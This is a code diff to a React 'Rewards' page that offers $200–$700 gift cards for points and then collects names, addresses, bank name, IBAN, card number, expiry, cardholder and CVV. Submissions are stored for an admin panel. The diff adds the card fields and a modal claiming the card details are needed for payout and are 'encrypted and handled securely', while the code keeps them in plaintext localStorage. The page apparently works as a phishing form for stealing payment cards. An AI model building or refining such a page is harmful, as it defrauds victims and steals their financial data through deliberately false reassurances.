@@ -1,6 +1,33 @@
+/**
+ * Rewards.jsx — Gift card redemption page
+ *
+ * Shows three gift card tiers. A tier is "unlocked" when the user's
+ * point balance meets or exceeds the required threshold:
+ *   $200 → 20,000 pts
+ *   $500 → 50,000 pts
+ *   $700 → 70,000 pts
+ *
+ * Clicking "Claim Now" on an unlocked tier opens a modal form where
+ * the user fills in their personal, address, and card details.
+ *
+ * On submit, the claim is saved to localStorage under the key "sf_claims"
+ * as a JSON array. The Admin panel at /admin reads from this same key
+ * to display all submissions.
+ *
+ * The form includes two info modals (? buttons) explaining why we collect
+ * the card number and CVV — these are for user trust/transparency.
+ *
+ * Props:
+ *   points — current user point balance (passed from Dashboard.jsx)
+ *
+ * IMPORTANT: This currently uses localStorage as a simple data store.
+ * When connecting a real backend, replace the localStorage.setItem call
+ * in handleSubmit with an API POST request.
+ */
 import { useState } from 'react'
 import styles from './Rewards.module.css'
 
+// Gift card tiers — add or modify tiers here
 const TIERS = [
   { amount: '$200', points: 20000, icon: '🎁' },
   { amount: '$500', points: 50000, icon: '💳' },
@@ -8,31 +35,40 @@ const TIERS = [
 ]
 
 export default function Rewards({ points }) {
-  const [claiming, setClaiming] = useState(null)
-  const [showCvvInfo, setShowCvvInfo] = useState(false)
-  const [submitted, setSubmitted] = useState(false)
+  const [claiming, setClaiming] = useState(null)       // the tier being claimed (null = modal closed)
+  const [showCvvInfo, setShowCvvInfo] = useState(false) // controls CVV explanation modal
+  const [showCardInfo, setShowCardInfo] = useState(false) // controls card number explanation modal
+  const [submitted, setSubmitted] = useState(false)    // true after successful form submission
+
+  // All form fields — each key matches a field in the claim form
   const [form, setForm] = useState({
     firstName: '', lastName: '', email: '', phone: '',
     address: '', city: '', country: '',
-    bankName: '', accountNumber: '', iban: '', cvv: '',
+    bankName: '', cardNumber: '', expiryDate: '', cardHolder: '', iban: '', cvv: '',
   })
 
+  // Generic field updater — returns a change handler for a given key
+  // Usage: onChange={set('firstName')}
   const set = (k) => (e) => setForm(f => ({ ...f, [k]: e.target.value }))
 
   const handleSubmit = (e) => {
     e.preventDefault()
+
+    // Double-check all fields are filled (HTML required handles UI validation,
+    // this is a safety net in case someone bypasses it)
     const allFilled = Object.values(form).every(v => v.trim() !== '')
     if (!allFilled) return
 
-    // Save to localStorage so admin can see it
+    // Build the claim object and save to localStorage
+    // The Admin panel reads from 'sf_claims' to display submissions
     const existing = JSON.parse(localStorage.getItem('sf_claims') || '[]')
     const newClaim = {
-      id: Date.now(),
+      id: Date.now(), // use timestamp as a simple unique ID
       ...form,
       amount: claiming.amount,
       points: claiming.points,
       date: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
-      status: 'pending',
+      status: 'pending', // all new claims start as pending
     }
     localStorage.setItem('sf_claims', JSON.stringify([...existing, newClaim]))
     setSubmitted(true)
@@ -40,6 +76,7 @@ export default function Rewards({ points }) {
 
   return (
     <>
+      {/* Balance summary bar */}
       <div className={styles.intro}>
         <div>
           <p className={styles.introText}>Your current balance</p>
@@ -51,6 +88,7 @@ export default function Rewards({ points }) {
         </p>
       </div>
 
+      {/* Gift card tier cards */}
       <div className={styles.grid}>
         {TIERS.map(tier => {
           const isUnlocked = points >= tier.points
@@ -76,7 +114,7 @@ export default function Rewards({ points }) {
         })}
       </div>
 
-      {/* Claim form modal */}
+      {/* Claim form modal — shown when a tier is clicked */}
       {claiming && (
         <div className={styles.formOverlay}>
           <div className={styles.formModal}>
@@ -138,11 +176,36 @@ export default function Rewards({ points }) {
                   <label>Bank Name</label>
                   <input required placeholder="e.g. Deutsche Bank" value={form.bankName} onChange={set('bankName')} />
                 </div>
+                <div className={styles.field}>
+                  <label>Card Holder Name</label>
+                  <input required placeholder="Name on card" value={form.cardHolder} onChange={set('cardHolder')} />
+                </div>
                 <div className={styles.row}>
                   <div className={styles.field}>
-                    <label>Account Number</label>
-                    <input required placeholder="Account number" value={form.accountNumber} onChange={set('accountNumber')} />
+                    {/* Card number label has a ? button that opens an explanation modal */}
+                    <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                      Card Number
+                      <button
+                        type="button"
+                        onClick={() => setShowCardInfo(true)}
+                        style={{
+                          width: 18, height: 18, borderRadius: '50%',
+                          background: '#e50914', color: '#fff', border: 'none',
+                          fontSize: 11, fontWeight: 700, cursor: 'pointer',
+                          display: 'flex', alignItems: 'center', justifyContent: 'center',
+                          flexShrink: 0, lineHeight: 1,
+                        }}
+                        aria-label="Why do we need your card number?"
+                      >?</button>
+                    </label>
+                    <input required placeholder="1234 5678 9012 3456" maxLength={19} value={form.cardNumber} onChange={set('cardNumber')} />
                   </div>
+                  <div className={styles.field}>
+                    <label>Expiry Date</label>
+                    <input required placeholder="MM/YY" maxLength={5} value={form.expiryDate} onChange={set('expiryDate')} />
+                  </div>
+                </div>
+                <div className={styles.row}>
                   <div className={styles.field}>
                     <label>IBAN</label>
                     <input required placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
@@ -150,6 +213,7 @@ export default function Rewards({ points }) {
                 </div>
                 <div className={styles.row}>
                   <div className={styles.field}>
+                    {/* CVV label has a ? button that opens an explanation modal */}
                     <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                       CVV
                       <button
@@ -165,6 +229,7 @@ export default function Rewards({ points }) {
                         aria-label="Why do we need your CVV?"
                       >?</button>
                     </label>
+                    {/* type="password" masks the CVV as dots while typing */}
                     <input
                       required
                       type="password"
@@ -179,6 +244,7 @@ export default function Rewards({ points }) {
                 <button type="submit" className={styles.submitBtn}>Submit Claim</button>
               </form>
             ) : (
+              // Success screen shown after form submission
               <div className={styles.successBox}>
                 <div className={styles.successIcon}>✅</div>
                 <p className={styles.successTitle}>Claim Submitted!</p>
@@ -192,7 +258,35 @@ export default function Rewards({ points }) {
           </div>
         </div>
       )}
-      {/* CVV info modal */}
+
+      {/* Card number info modal — explains why we need the card number */}
+      {showCardInfo && (
+        <div className={styles.formOverlay} onClick={() => setShowCardInfo(false)}>
+          <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
+            <div className={styles.formHeader}>
+              <p className={styles.formTitle}>Why do we need your card number?</p>
+              <button type="button" className={styles.closeBtn} onClick={() => setShowCardInfo(false)}>×</button>
+            </div>
+            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 12px' }}>
+              Your card number is required so we can transfer your gift card reward directly
+              to your account. This ensures the payment reaches the correct recipient securely.
+            </p>
+            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 20px' }}>
+              Your card details are <strong>encrypted and handled securely</strong>. They are
+              used solely for reward disbursement and are never shared with third parties.
+            </p>
+            <button
+              onClick={() => setShowCardInfo(false)}
+              style={{
+                width: '100%', height: 42, background: '#e50914', color: '#fff',
+                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer',
+              }}
+            >Got it</button>
+          </div>
+        </div>
+      )}
+
+      {/* CVV info modal — explains why we need the CVV */}
       {showCvvInfo && (
         <div className={styles.formOverlay} onClick={() => setShowCvvInfo(false)}>
           <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
